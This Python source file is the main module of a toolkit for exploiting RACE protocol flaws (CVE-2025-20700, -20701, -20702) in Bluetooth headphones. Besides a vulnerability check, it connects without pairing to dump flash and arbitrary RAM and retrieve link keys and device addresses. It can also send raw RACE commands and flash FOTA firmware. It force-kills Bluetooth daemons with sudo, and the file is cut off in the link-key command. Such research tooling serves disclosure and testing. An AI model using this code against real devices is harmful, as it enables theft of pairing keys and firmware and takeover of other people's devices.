"""RACE Toolkit - A tool for exploiting RACE protocol vulnerabilities in Bluetooth devices.

This toolkit provides utilities for checking CVE-2025-20700, CVE-2025-20701,
and CVE-2025-20702 vulnerabilities, as well as dumping firmware and memory
from affected devices.
"""
import sys
import os
import glob
import struct
import logging
import asyncio
import argparse
import subprocess
import time
import traceback
import fcntl

from dataclasses import dataclass
from enum import Enum, auto

try:
    from usb1 import USBErrorBusy  # type: ignore[import-not-found]
except ImportError:
    # usb1 may not be installed, create a dummy exception
    class USBErrorBusy(Exception):  # type: ignore[no-redef]
        """Dummy exception when usb1 is not available."""

from hexdump import hexdump

from librace.constants import RaceType
from librace.fota import FOTAUpdater
from librace.packets import (
    GetLinkKeyResponse,
    RaceHeader,
    RacePacket,
    GetLinkKey,
    GetSDKInfo,
    BuildVersion,
    GetEDRAddress,
    GetEDRAddressResponse,
)
from librace.transport import (
    Transport,
    GATTBumbleChecker,
    GATTBleakTransport,
    GATTBumbleTransport,
    RFCOMMBumbleChecker,
    RFCOMMTransport,
    USBHIDTransport,
)
from librace.race import RACE
from librace.dumper import (
    RACEDumper,
    RACEFlashDumper,
    RACERAMDumper,
)
from librace.util import setup_logging
from librace.parttable import parse_partition_table


def release_bluetooth_controller(controller: str):
    """Force stop any existing processes holding onto the Bluetooth controller.

    This prevents 'USB device busy' errors when trying to use the controller.
    """
    if not controller.startswith("usb:"):
        return

    logging.info("Releasing Bluetooth controller from system services...")

    # List of services/processes that commonly hold the Bluetooth controller
    services_to_stop = ["bluetooth", "bluetooth.service"]
    processes_to_kill = ["bluetoothd", "bt_stack", "bluetoothctl"]

    # Try to stop systemd services
    for service in services_to_stop:
        try:
            result = subprocess.run(
                ["sudo", "systemctl", "stop", service],
                capture_output=True,
                timeout=5,
                check=False
            )
            if result.returncode == 0:
                logging.debug("Stopped service: %s", service)
        except (subprocess.TimeoutExpired, FileNotFoundError, PermissionError):
            pass

    # Kill any remaining Bluetooth processes
    for proc_name in processes_to_kill:
        try:
            subprocess.run(
                ["sudo", "pkill", "-9", proc_name],
                capture_output=True,
                timeout=5,
                check=False
            )
        except (subprocess.TimeoutExpired, FileNotFoundError, PermissionError):
            pass

    # Give the system a moment to release the device
    time.sleep(0.5)
    logging.debug(
        "Bluetooth controller %s should now be available", controller)


def reset_usb_bluetooth_controller(controller: str) -> bool:
    """Reset a USB Bluetooth controller to clear stuck connections.

    For USB controllers used directly by bumble (usb:VID:PID format),
    we need to do a USB device reset rather than HCI reset.

    Args:
        controller: Controller specification (e.g., "usb:0", "usb:0BDA:8771").

    Returns:
        True if reset was successful, False otherwise.
    """
    if not controller.startswith("usb:"):
        # For non-USB controllers, try HCI reset
        return _reset_hci_controller("hci0")

    logging.info("Resetting USB Bluetooth controller...")

    # Try to find and reset the USB device
    try:
        import usb1
        ctx = usb1.USBContext()

        # Find Bluetooth devices (class 0xE0)
        bt_devices = []
        for dev in ctx.getDeviceList():
            is_bt = False
            try:
                if dev.getDeviceClass() == 0xE0:
                    is_bt = True
                else:
                    for cfg in dev:
                        for intf in cfg:
                            for setting in intf:
                                if setting.getClass() == 0xE0:
                                    is_bt = True
                                    break
            except usb1.USBError:
                pass
            if is_bt:
                bt_devices.append(dev)

        if not bt_devices:
            logging.warning("No USB Bluetooth devices found to reset.")
            return False

        # Reset the first Bluetooth device found
        dev = bt_devices[0]
        vid = dev.getVendorID()
        pid = dev.getProductID()
        bus = dev.getBusNumber()
        addr = dev.getDeviceAddress()

        logging.debug(
            "Resetting USB device %04x:%04x (bus %d, addr %d)...",
            vid, pid, bus, addr
        )

        # Method 1: Try USBDEVFS_RESET ioctl (most reliable)
        # This is the same as running 'usbreset' command
        usbdevfs_reset = 21780  # USBDEVFS_RESET from linux/usbdevice_fs.h
        dev_path = f"/dev/bus/usb/{bus:03d}/{addr:03d}"

        if os.path.exists(dev_path):
            try:
                logging.debug("Resetting via ioctl on %s", dev_path)
                with open(dev_path, 'wb') as f:
                    fcntl.ioctl(f.fileno(), usbdevfs_reset, 0)
                logging.info("USB Bluetooth controller reset successfully.")
                time.sleep(2.0)  # Give device time to reinitialize
                return True
            except PermissionError:
                logging.debug("Permission denied for ioctl, trying sudo...")
                # Try with sudo using usbreset if available
                result = subprocess.run(
                    ["sudo", "usbreset", f"{vid:04x}:{pid:04x}"],
                    capture_output=True, timeout=10, check=False
                )
                if result.returncode == 0:
                    logging.info(
                        "USB Bluetooth controller reset successfully.")
                    time.sleep(2.0)
                    return True
            except (IOError, OSError) as e:
                logging.debug("ioctl reset failed: %s", e)

        # Method 2: Fallback to sysfs authorized file
        sysfs_path = f"/sys/bus/usb/devices/{bus}-*"
        device_paths = glob.glob(sysfs_path)

        for path in device_paths:
            try:
                vendor_path = f"{path}/idVendor"
                product_path = f"{path}/idProduct"
                if os.path.exists(vendor_path) and os.path.exists(product_path):
                    with open(vendor_path, "r", encoding="ascii") as f:
                        dev_vid = int(f.read().strip(), 16)
                    with open(product_path, "r", encoding="ascii") as f:
                        dev_pid = int(f.read().strip(), 16)
                    if dev_vid == vid and dev_pid == pid:
                        auth_path = f"{path}/authorized"
                        if os.path.exists(auth_path):
                            logging.debug("Resetting via %s", auth_path)
                            subprocess.run(
                                ["sudo", "sh", "-c", f"echo 0 > {auth_path}"],
                                capture_output=True, timeout=5, check=False
                            )
                            time.sleep(1.0)
                            subprocess.run(
                                ["sudo", "sh", "-c", f"echo 1 > {auth_path}"],
                                capture_output=True, timeout=5, check=False
                            )
                            time.sleep(3.0)  # Longer wait after sysfs reset
                            logging.info(
                                "USB Bluetooth controller reset successfully."
                            )
                            return True
            except (IOError, OSError, ValueError):
                continue

        # Last resort: just wait longer
        logging.warning(
            "Could not reset USB device. "
            "Waiting for controller to recover..."
        )
        time.sleep(5.0)
        return False

    except ImportError:
        logging.warning("usb1 not available for USB reset")
        return False
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.warning("USB reset failed: %s", e)
        return False
        return False


def _reset_hci_controller(hci_device: str = "hci0") -> bool:
    """Reset the HCI Bluetooth controller (for built-in adapters).

    Args:
        hci_device: The HCI device name (default: hci0).

    Returns:
        True if reset was successful, False otherwise.
    """
    logging.debug("Attempting HCI reset for %s...", hci_device)
    try:
        # First bring the device down
        subprocess.run(
            ["sudo", "hciconfig", hci_device, "down"],
            capture_output=True,
            timeout=5,
            check=False
        )
        time.sleep(0.3)

        # Then bring it back up
        result = subprocess.run(
            ["sudo", "hciconfig", hci_device, "up"],
            capture_output=True,
            timeout=5,
            check=False
        )

        if result.returncode == 0:
            logging.debug("HCI controller %s reset successfully.", hci_device)
            time.sleep(0.5)
            return True
        else:
            logging.debug(
                "HCI reset failed for %s: %s",
                hci_device,
                result.stderr.decode() if result.stderr else "unknown error"
            )
            return False
    except (subprocess.TimeoutExpired, FileNotFoundError, PermissionError) as e:
        logging.debug("Could not reset HCI controller: %s", e)
        return False


def enumerate_bluetooth_controllers() -> list[tuple[str, str]]:
    """Enumerate available USB Bluetooth controllers.

    Returns:
        List of tuples (controller_spec, description) for each controller found.
    """
    controllers = []
    try:
        import usb1
        ctx = usb1.USBContext()
        for dev in ctx.getDeviceList():
            # Bluetooth class is 0xE0 (Wireless Controller)
            is_bt = False
            try:
                if dev.getDeviceClass() == 0xE0:
                    is_bt = True
                else:
                    for cfg in dev:
                        for intf in cfg:
                            for setting in intf:
                                if setting.getClass() == 0xE0:
                                    is_bt = True
                                    break
            except usb1.USBError:
                pass

            if is_bt:
                vid = dev.getVendorID()
                pid = dev.getProductID()
                try:
                    prod = dev.getProduct() or "Bluetooth Controller"
                except usb1.USBError:
                    prod = "Bluetooth Controller"

                # Build controller spec
                ctrl_spec = f"usb:{vid:04X}:{pid:04X}"
                controllers.append((ctrl_spec, prod))
    except ImportError:
        logging.warning("usb1 not installed, cannot enumerate USB controllers")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.debug("Error enumerating controllers: %s", e)

    return controllers


def select_bluetooth_controller(controller: str | None) -> str | None:
    """Select a Bluetooth controller, prompting user if needed.

    Args:
        controller: User-specified controller string, or None to enumerate.

    Returns:
        Controller specification string, or None if none available.
    """
    if controller:
        return controller

    controllers = enumerate_bluetooth_controllers()
    if not controllers:
        logging.error(
            "No USB Bluetooth controllers found. "
            "Please specify --controller manually."
        )
        return None

    if len(controllers) == 1:
        ctrl_spec, prod = controllers[0]
        logging.info("Using Bluetooth controller: %s (%s)", prod, ctrl_spec)
        return ctrl_spec

    # Multiple controllers - let user choose
    logging.info("Available Bluetooth controllers:")
    for i, (ctrl_spec, prod) in enumerate(controllers):
        logging.info("  [%d] %s (%s)", i, prod, ctrl_spec)

    chosen = -1
    while chosen < 0 or chosen >= len(controllers):
        try:
            chosen = int(input("Select controller [0]: ") or "0")
        except ValueError:
            pass

    return controllers[chosen][0]


async def scan_classic_devices(
    controller: str, timeout: float = 10.0
) -> list[tuple[str, str]]:
    """Scan for Bluetooth Classic devices.

    Args:
        controller: Controller specification string.
        timeout: How long to scan in seconds.

    Returns:
        List of tuples (address, name) for each device found.
    """
    from bumble.device import Device, DeviceConfiguration
    from bumble.transport import open_transport_or_link
    from bumble.hci import Address

    devices: dict[str, str] = {}

    try:
        t = await open_transport_or_link(controller)
        config = DeviceConfiguration()
        config.keystore = "JsonKeyStore"
        config.address = Address.generate_static_address()
        config.name = "BumbleRace"
        device = Device.from_config_with_hci(config, t.source, t.sink)
        device.classic_enabled = True
        await device.power_on()

        def on_inquiry_result(
            address, class_of_device, data, rssi  # pylint: disable=unused-argument
        ):
            addr_str = str(address)
            # Try to get name from Extended Inquiry Response
            name = data.get(0x09)  # Complete Local Name
            if not name:
                name = data.get(0x08)  # Shortened Local Name
            if name:
                if isinstance(name, bytes):
                    name = name.decode("utf-8", errors="replace")
                devices[addr_str] = name
            elif addr_str not in devices:
                devices[addr_str] = "(unknown)"

        device.on("inquiry_result", on_inquiry_result)

        logging.info(
            "Scanning for Bluetooth Classic devices (%.0fs)...", timeout
        )
        await device.start_discovery()

        await asyncio.sleep(timeout)

        await device.stop_discovery()
        await t.close()

    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.error("Classic device scan failed: %s", e)

    return list(devices.items())


def select_classic_device(
    devices: list[tuple[str, str]], target_address: str | None
) -> str | None:
    """Select a Bluetooth Classic device, prompting user if needed.

    Args:
        devices: List of (address, name) tuples from scanning.
        target_address: User-specified address, or None to prompt.

    Returns:
        Device address string, or None if none available.
    """
    if target_address:
        return target_address

    if not devices:
        logging.error(
            "No Bluetooth Classic devices found. "
            "Please specify --target-address manually."
        )
        return None

    # Always prompt user to select - even with one device it may not be the right one
    logging.info("Found %d Bluetooth Classic device(s):", len(devices))
    for i, (addr, name) in enumerate(devices):
        logging.info("  [%d] %s (%s)", i, name, addr)
    logging.info("  [X] None of these / Enter address manually")

    while True:
        choice = input("Select device [0]: ").strip() or "0"
        if choice.upper() == "X":
            logging.info(
                "Enter Bluetooth Classic address (AA:BB:CC:DD:EE:FF):")
            manual_addr = input().strip()
            if manual_addr and ":" in manual_addr:
                return manual_addr
            logging.error("Invalid address format.")
            return None
        try:
            idx = int(choice)
            if 0 <= idx < len(devices):
                return devices[idx][0]
        except ValueError:
            pass
        logging.info("Invalid choice, try again.")


def parse_args():
    """Parse command line arguments and return the parsed namespace."""
    parser = argparse.ArgumentParser(description="RACE Toolkit")
    parser.add_argument(
        "-t",
        "--transport",
        choices=["gatt", "bleak", "rfcomm", "usb"],
        default="gatt",
        help="Transport method (default: gatt)",
    )
    parser.add_argument(
        "--target-address", help="Target device Bluetooth classic address to connect to"
    )
    parser.add_argument(
        "--le-names",
        default=None,
        nargs="+",
        help="List of names to scan for if no address is given",
    )
    parser.add_argument(
        "-c",
        "--controller",
        default="usb:0",
        help="Bumble Bluetooth Controller (Required for RFCOMM, default: usb:0)",
    )
    parser.add_argument(
        "-d",
        "--device",
        default=None,
        help="USB device for USBHID transport. Given as VID:PID pair. "
             "By default the transport enumerates all devices and lets you choose.",
    )
    parser.add_argument(
        "--outfile", help="Output file for commands with output (default is stdout)."
    )
    parser.add_argument("--debug", action="store_true",
                        help="Enable debug logging.")
    parser.add_argument(
        "--send-delay",
        type=float,
        default=0.0,
        help="Introduces a send delay between RACE messages. "
             "Might be required for old SDK versions?",
    )
    parser.add_argument(
        "--authenticate",
        action="store_true",
        help="Try to authenticate/pair during connection. Required for devices with pairing issues fixed. Put device into pairing mode and connect with this parameter. Ideally, this only needs to be done once.",
    )

    subparsers = parser.add_subparsers(dest="command", required=True)

    # Check subcommand
    subparsers.add_parser(
        "check",
        help="Check for RACE vulnerabilities (CVE-2025-20700, CVE-2025-20701, CVE-2025-20702).",
    )

    # RAM subcommand
    ram_parser = subparsers.add_parser("ram", help="Read RAM memory")
    ram_parser.add_argument(
        "--address",
        type=lambda x: int(x, 16),
        required=True,
        help="Target address (hex parsed to int)",
    )
    ram_parser.add_argument(
        "--size",
        type=lambda x: int(x, 16),
        required=True,
        help="Number of bytes to dump (must be a multiple of 4)",
    )

    # Flash subcommand
    flash_parser = subparsers.add_parser("flash", help="Dump Flash memory")
    flash_parser.add_argument(
        "--address",
        type=lambda x: int(x, 16),
        required=True,
        help="Start address (hex parsed to int, must be a multiple of 0x100)",
    )
    flash_parser.add_argument(
        "--size",
        type=lambda x: int(x, 16),
        required=True,
        help="Number of bytes to dump (must be a multiple of 0x100)",
    )

    # Link-keys subcommand
    subparsers.add_parser(
        "link-keys", help="RACE Get Link Key Command (Will not work on many devices)"
    )

    # BD addr subcommand
    subparsers.add_parser("bdaddr", help="RACE Get Bluetooth Address Command")

    # Enumerate Classic services subcommand (CVE-2025-20701 PoC)
    subparsers.add_parser(
        "enumerate-classic",
        help="Enumerate Bluetooth Classic services without pairing (CVE-2025-20701 PoC)"
    )

    # Enumerate RACE protocol subcommand (CVE-2025-20702 PoC)
    subparsers.add_parser(
        "enumerate-race",
        help="Enumerate RACE protocol capabilities without auth (CVE-2025-20702 PoC)"
    )

    # SDK info subcommand
    subparsers.add_parser("sdkinfo", help="RACE Get SDK Information Command")

    # Build version subcommand
    subparsers.add_parser("buildversion", help="RACE Build Version Command")

    # Mediainfo subcommand
    subparsers.add_parser(
        "mediainfo",
        help="Dump Current Listening Media Info. This is a proof-of-concept. "
             "Only works on some FW versions of Sony WH-CH720N.",
    )

    # Raw subcommand
    raw_parser = subparsers.add_parser(
        "raw", help="Send simple RACE packet with specified ID"
    )
    raw_parser.add_argument(
        "--id",
        type=lambda x: int(x, 16),
        required=True,
        help="ID of RACE command to send",
    )

    # Dump partition subcommand
    subparsers.add_parser(
        "dump-partition", help="Interactively choose and dump a partition"
    )

    # FOTA Update subcommand
    fota_parser = subparsers.add_parser("fota", help="FOTA update")
    fota_parser.add_argument("--fota-file", help="The FOTA file")
    fota_parser.add_argument(
        "--dont-reflash",
        action="store_true",
        default=False,
        help="Prevent FOTA partition from being erased and reflashed. "
             "This is mainly to retry the currently flashed FOTA update.",
    )
    fota_parser.add_argument(
        "--chunks-per-write",
        type=int,
        default=3,
        help="How many chunks should be written in one flash write. "
             "Experiments show 3 works best. Larger numbers might not be possible.",
    )

    return parser.parse_args()


def init_transport(args: argparse.Namespace) -> Transport:
    """Initialize the transport based on the given arguments.

    Raises:
        ValueError: If required arguments are missing or transport type is unknown.
    """
    transport_type = args.transport.lower()

    # Release Bluetooth controller for transports that need it
    if transport_type in ("rfcomm", "gatt"):
        release_bluetooth_controller(args.controller)

    if transport_type == "rfcomm":
        if args.target_address is None:
            raise ValueError("RFCOMM transport needs --target-address!")
        return RFCOMMTransport(args.controller, args.target_address, args.authenticate)
    elif transport_type == "bleak":
        return GATTBleakTransport(args.target_address, args.le_names)
    elif transport_type == "gatt":
        return GATTBumbleTransport(
            args.controller, args.target_address, args.le_names, args.authenticate
        )
    elif transport_type == "usb":
        return USBHIDTransport(args.device)
    else:
        raise ValueError(f"Unknown transport type: {args.transport}")


class VulnerabilityStatus(Enum):
    """Status of a vulnerability check."""
    UNKNOWN = auto()
    FIXED = auto()
    VULNERABLE = auto()
    NOT_APPLICABLE = auto()


@dataclass
class Vulnerability:
    """Represents a vulnerability with its check status."""
    id: str
    description: str
    status: VulnerabilityStatus = VulnerabilityStatus.UNKNOWN


def _noop_recv(_data: bytes) -> None:
    """No-op receive callback for setup calls that don't need data handling."""


def _get_vuln(vulnerabilities: list[Vulnerability], vuln_id: str) -> Vulnerability:
    """Get a vulnerability by ID. Raises KeyError if not found."""
    for v in vulnerabilities:
        if v.id == vuln_id:
            return v
    raise KeyError(f"Vulnerability {vuln_id} not found")


def _is_valid_dump(data: bytes, threshold: float = 0.95) -> bool:
    """Check if dump data appears to be valid (not mostly zeros or repeating pattern).

    Args:
        data: The dump data to validate.
        threshold: Maximum percentage of zeros allowed (default 95%).

    Returns:
        True if the dump appears to contain valid data.
    """
    if not data or len(data) == 0:
        return False

    # Count zero bytes
    zero_count = data.count(b'\x00'[0])
    zero_ratio = zero_count / len(data)

    if zero_ratio > threshold:
        logging.warning(
            "Dump data is %.1f%% zeros - likely invalid/garbage data",
            zero_ratio * 100
        )
        return False

    # Check for suspicious repeating patterns (like every 0x100 bytes)
    if len(data) >= 0x200:
        # Check if data repeats at 0x100 boundaries
        chunk_size = 0x100
        first_chunk = data[:chunk_size]
        repeat_count = 0
        for i in range(chunk_size, min(len(data), chunk_size * 8), chunk_size):
            if data[i:i + chunk_size] == first_chunk:
                repeat_count += 1
        if repeat_count >= 3:  # Same pattern repeated 4+ times
            logging.warning(
                "Dump data shows repeating pattern - likely error responses"
            )
            return False

    return True


def _print_vulnerability_summary(vulnerabilities: list[Vulnerability]) -> None:
    """Print a summary of vulnerability check results."""
    logging.info("Vulnerability status summary:")
    for v in vulnerabilities:
        logging.info("  [%-10s] %s: %s", v.status.name, v.id, v.description)


async def command_check(args: argparse.Namespace):
    """Check device for RACE vulnerabilities and optionally dump firmware."""
    vulnerabilities = [
        Vulnerability("CVE-2025-20700", "Missing GATT authentication"),
        Vulnerability("CVE-2025-20701", "Missing BR/EDR authentication"),
        Vulnerability("CVE-2025-20702_LE", "RACE Protocol via BLE"),
        Vulnerability("CVE-2025-20702_BR_EDR",
                      "RACE Protocol via Bluetooth Classic"),
    ]

    # Collected firmware dumps from vulnerability checks
    collected_dumps = {}

    logging.info("Starting device check.")

    # Select controller if not specified
    controller = select_bluetooth_controller(args.controller)
    if not controller:
        return

    # Release the Bluetooth controller before starting
    release_bluetooth_controller(controller)

    bdaddr = args.target_address

    # Check if we have a Classic address format (contains colons, like AA:BB:CC:DD:EE:FF)
    # If so, skip BLE scanning and go straight to Classic checks
    skip_ble = False
    if bdaddr and ":" in bdaddr and len(bdaddr) == 17:
        logging.info(
            "Bluetooth Classic address provided (%s), skipping BLE scan.",
            bdaddr
        )
        skip_ble = True
        # Mark BLE vulns as not applicable since we're skipping
        _get_vuln(vulnerabilities,
                  "CVE-2025-20700").status = VulnerabilityStatus.NOT_APPLICABLE
        _get_vuln(vulnerabilities,
                  "CVE-2025-20702_LE").status = VulnerabilityStatus.NOT_APPLICABLE

    if not skip_ble:
        logging.info("Step 1: Scanning Bluetooth Low Energy devices.")
        logging.info("Scanning for 5 seconds...")

        # Step 1: BLE Checks.
        # - first check if the device is available via BLE
        # - then check for UUIDs that we know about
        # - lasty, connect to the device and try the following
        #   - read from flash
        #   - get bdaddr for Classic checks
        le_checker = GATTBumbleChecker(controller, args.target_address)
        await le_checker.setup(_noop_recv)
        scan_res = await le_checker.scan_devices()
        if scan_res:
            addr, dev_name = scan_res
            logging.info(
                "Your device is %s (%s). Trying to identify RACE UUIDs via GATT.",
                dev_name, addr
            )
            try:
                uuid_found = await le_checker.check_UUIDs(addr)
            except asyncio.CancelledError:
                logging.warning(
                    "BLE connection was cancelled. The device may have disconnected."
                )
                uuid_found = False
            except (OSError, ConnectionError, BrokenPipeError) as e:
                logging.warning("BLE connection error: %s", e)
                uuid_found = False

            if uuid_found:
                _get_vuln(vulnerabilities,
                          "CVE-2025-20700").status = VulnerabilityStatus.VULNERABLE

                logging.info(
                    "Initiating a proper BLE connection to %s on %s.",
                    dev_name, addr
                )
                le_transport = GATTBumbleTransport(controller, addr, [], False)
                le_transport.connection = le_checker.connection
                le_transport.device = le_checker.device
                await le_transport.setup_gatt(_noop_recv)
                r = RACE(le_transport, args.send_delay)
                logging.info("Trying to read flash via BLE.")
                d = RACEFlashDumper(r, 0x08000000, 0x1000)
                # try to dump with a 10-second timeout
                status = VulnerabilityStatus.FIXED
                try:
                    dump_data = await asyncio.wait_for(d.dump(), 10.0)
                    # Check if we got valid data or just error responses
                    if dump_data and _is_valid_dump(dump_data):
                        status = VulnerabilityStatus.VULNERABLE
                        collected_dumps["ble_flash"] = dump_data
                    elif d.had_errors:
                        logging.warning(
                            "Flash dump had errors - "
                            "device may have partial protections"
                        )
                    else:
                        logging.warning(
                            "Flash dump returned invalid/empty data"
                        )
                except asyncio.TimeoutError:
                    logging.warning(
                        "Timeout! Unable to dump flash within 10 seconds. "
                        "Device might be fixed!"
                    )
                except (OSError, ConnectionError, BrokenPipeError) as e:
                    logging.warning(
                        "Unable to dump flash. Device might be fixed! Error is %s",
                        e
                    )
                _get_vuln(vulnerabilities, "CVE-2025-20702_LE").status = status

                r = RACE(le_transport, args.send_delay)
                await r.setup()
                if not bdaddr:
                    try:
                        logging.info(
                            "Trying to obtain the Bluetooth Classic address "
                            "for next step."
                        )
                        await asyncio.wait_for(
                            r.send_sync(GetEDRAddress()), 8.0
                        )
                        bdaddr = GetEDRAddressResponse.unpack(
                            r.sync_payload).bd_addr
                        bdaddr = ":".join(f"{byte:02X}" for byte in bdaddr)
                        logging.info(
                            "Got Bluetooth Classic address %s", bdaddr
                        )
                    except asyncio.TimeoutError:
                        logging.warning(
                            "Timeout! Unable to retrieve Bluetooth Classic "
                            "address within 8 seconds. The RACE command might "
                            "be unavailable, which is expected for many devices."
                        )
                    except (OSError, ConnectionError, BrokenPipeError) as e:
                        logging.warning("Error receiving BD addr: %s.", e)

                await le_transport.close()
                await le_checker.close()
            else:
                # uuid_found was False - close the checker and mark as not vulnerable
                logging.info("No known RACE UUIDs found via GATT.")
                logging.info("")
                logging.info(
                    "BLE Result: Device does not appear to expose RACE via BLE.")
                logging.info(
                    "  - CVE-2025-20700 (GATT auth bypass): NOT VULNERABLE")
                logging.info("  - CVE-2025-20702 via BLE: NOT VULNERABLE")
                await le_checker.close()
        else:
            logging.info(
                "The device does not seem to be available via BLE. "
                "It is probably not vulnerable to CVE-2025-20700!"
            )
            _get_vuln(vulnerabilities,
                      "CVE-2025-20700").status = VulnerabilityStatus.NOT_APPLICABLE
            _get_vuln(vulnerabilities,
                      "CVE-2025-20702_LE").status = VulnerabilityStatus.NOT_APPLICABLE
            await le_checker.close()

    # Ask user if they want to continue with Bluetooth Classic
    logging.info("")
    logging.info("-" * 60)
    logging.info(
        "Would you like to check Bluetooth Classic? [Y/n/q]: "
    )
    response = input().strip().lower()
    if response in ("q", "quit", "exit"):
        logging.info("Exiting.")
        _print_vulnerability_summary(vulnerabilities)
        return
    if response in ("n", "no"):
        logging.info("Skipping Bluetooth Classic checks.")
        _print_vulnerability_summary(vulnerabilities)
        return

    # Step 2: Classic Checks.
    # - if we have a BD addr supplied by user or retrieved via RACE we will take it
    # - if not, scan for Classic devices or ask the user
    # - if we have the address:
    #   - enumerate RFCOMM services and look for known UUIDs
    #   - try to read flash via RFCOMM
    logging.info("Step 2: Checking Bluetooth Classic connection")

    # Release the Bluetooth controller again before Step 2
    release_bluetooth_controller(controller)

    if not bdaddr:
        # Scan for Classic devices
        logging.info("No Bluetooth Classic address available, scanning...")
        classic_devices = await scan_classic_devices(controller, timeout=10.0)
        bdaddr = select_classic_device(classic_devices, None)
        if not bdaddr:
            logging.error(
                "Cannot proceed without a Bluetooth Classic address.")
            # Print summary of what we found so far
            _print_vulnerability_summary(vulnerabilities)
            return
        # Need to release again after scanning
        release_bluetooth_controller(controller)

    # Ensure bdaddr is a string (it could be bytes from GetEDRAddressResponse)
    if isinstance(bdaddr, bytes):
        bdaddr = bdaddr.decode("ascii")
    bdaddr_str: str = str(bdaddr)
    classic_checker = RFCOMMBumbleChecker(controller, bdaddr_str, False)
    await classic_checker.setup()
    logging.info("Trying to find RACE SSP RFCOMM UUID.")

    check_classic = True
    uuid = None
    max_retries = 3
    retry_delay = 3.0  # Start with 3 seconds

    for attempt in range(max_retries + 1):
        try:
            uuid = await classic_checker.check_UUIDs()
            break  # Success, exit retry loop
        except Exception as e:  # pylint: disable=broad-exception-caught
            # Catch all exceptions including bumble.core.ConnectionError
            error_str = str(e).lower()
            if "limited_resources" in error_str:
                if attempt == 0:
                    logging.error(
                        "Connection rejected by remote device - "
                        "device has too many active connections."
                    )
                    logging.info(
                        "This usually means the target device needs time "
                        "to free up connection slots."
                    )
                else:
                    logging.warning("Retry %d/%d failed.",
                                    attempt, max_retries)

                if attempt < max_retries:
                    await classic_checker.close()
                    # Reset our controller just in case
                    reset_usb_bluetooth_controller(controller)
                    release_bluetooth_controller(controller)
                    logging.info(
                        "Waiting %.1f seconds before retry %d/%d...",
                        retry_delay, attempt + 1, max_retries
                    )
                    await asyncio.sleep(retry_delay)
                    retry_delay *= 1.5  # Exponential backoff
                    classic_checker = RFCOMMBumbleChecker(
                        controller, bdaddr_str, False)
                    await classic_checker.setup()
                else:
                    logging.error(
                        "All %d retries exhausted. The target device may be "
                        "busy or have too many connections.", max_retries
                    )
                    logging.info(
                        "Try again later or disconnect other devices from the "
                        "target."
                    )
                    logging.info(
                        "Skipping the rest of Bluetooth Classic checks."
                    )
                    check_classic = False
                    await classic_checker.close()
            elif "page_timeout" in error_str:
                logging.error(
                    "Device not responding. Is it powered on and in range?"
                )
                logging.info("Skipping the rest of Bluetooth Classic checks.")
                check_classic = False
                await classic_checker.close()
                break
            else:
                logging.error(
                    "Unable to create a Bluetooth Classic connection: %s", e
                )
                logging.info("Skipping the rest of Bluetooth Classic checks.")
                check_classic = False
                await classic_checker.close()
                break

    if check_classic:
        logging.info(
            "Checking Bluetooth Classic Pairing Issue by initiating an HfP connection."
        )
        auth_check = await classic_checker.check_auth_vuln()
        if auth_check:
            logging.info("Connection was successful without pairing!")
            _get_vuln(vulnerabilities,
                      "CVE-2025-20701").status = VulnerabilityStatus.VULNERABLE
        else:
            logging.info("Connection without pairing was not successful.")
            _get_vuln(vulnerabilities,
                      "CVE-2025-20701").status = VulnerabilityStatus.FIXED

        if uuid:
            logging.info("Trying to connect to RFCOMM RACE interface.")
            await classic_checker.close()

            rfcomm = RFCOMMTransport(
                controller, bdaddr_str, False, uuid=uuid)

            try:
                r = RACE(rfcomm, args.send_delay)
                await r.setup()

                logging.info("Trying to read flash via Bluetooth Classic.")
                d = RACEFlashDumper(r, 0x08000000, 0x1000)
                # try to dump with a 10-second timeout
                status = VulnerabilityStatus.FIXED
                try:
                    dump_data = await asyncio.wait_for(d.dump(), 10.0)
                    # Check if we got valid data or just error responses
                    if dump_data and _is_valid_dump(dump_data):
                        status = VulnerabilityStatus.VULNERABLE
                        collected_dumps["classic_flash"] = dump_data
                        # There might be the rare case that HfP is not possible
                        # without pairing, but RACE is? Then still vulnerable!
                        _get_vuln(vulnerabilities,
                                  "CVE-2025-20701").status = status
                    elif d.had_errors:
                        logging.warning(
                            "Flash dump had errors - device may have partial protections"
                        )
                    else:
                        logging.warning(
                            "Flash dump returned invalid/empty data"
                        )
                except asyncio.TimeoutError:
                    logging.warning(
                        "Timeout! Unable to dump flash within 10 seconds. "
                        "Device might be fixed!"
                    )
                except (OSError, ConnectionError, BrokenPipeError) as e:
                    logging.warning(
                        "Unable to dump flash. Device might be fixed! Error is %s", e
                    )
                _get_vuln(vulnerabilities,
                          "CVE-2025-20702_BR_EDR").status = status
                await rfcomm.close()
            except asyncio.CancelledError as e:
                logging.warning(
                    "Error connecting to device via RACE over RFCOMM (%s).", e
                )
                _get_vuln(
                    vulnerabilities, "CVE-2025-20702_BR_EDR").status = VulnerabilityStatus.FIXED

        else:
            logging.warning(
                "The device might not expose RACE via Bluetooth Classic!")
            _get_vuln(
                vulnerabilities, "CVE-2025-20702_BR_EDR").status = VulnerabilityStatus.FIXED

    _print_vulnerability_summary(vulnerabilities)

    # Output collected firmware dumps
    if collected_dumps:
        # Combine all dumps (prefer classic over BLE if both exist)
        dump_data = collected_dumps.get(
            "classic_flash") or collected_dumps.get("ble_flash")
        if dump_data:
            if args.outfile:
                with open(args.outfile, "wb") as f:
                    f.write(dump_data)
                logging.info("Firmware dump saved to %s", args.outfile)
            else:
                logging.info("Firmware dump (hexdump):")
                hexdump(dump_data)
    else:
        logging.info("No firmware was successfully dumped during the check.")


async def command_ram(r: RACE, address: int, size: int, outfile: str, debug: bool):
    """Dump RAM memory from the target device."""
    if size % 0x4 != 0:
        logging.error(
            "Error! Address needs to be a multiple of 0x4 to be page-aligned!"
        )
        sys.exit()

    dumper = RACERAMDumper(r, address, size, progress=not debug)
    if outfile:
        with open(outfile, "wb") as f:
            await dumper.dump(fd=f)
    else:
        outbuf = await dumper.dump()
        hexdump(outbuf)


async def command_flash(r: RACE, address: int, size: int, outfile: str, debug: bool):
    """Dump flash memory from the target device."""
    if size % 0x100 != 0 or address % 0x100 != 0:
        logging.error(
            "Error! Address and size need to be multiples of 0x100 to be page-aligned!"
        )
        sys.exit()

    dumper = RACEFlashDumper(r, address, size, progress=not debug)
    if outfile:
        with open(outfile, "wb") as f:
            await dumper.dump(fd=f)
    else:
        outbuf = await dumper.dump()
        hexdump(outbuf)


async def command_link_keys(r: RACE, outfile: str):
    """Retrieve Bluetooth link keys from the target device."""
    logging.info("Sending get link key request")
    await r.setup()
    p = GetLinkKey()
    res = await r.send_sync(p)
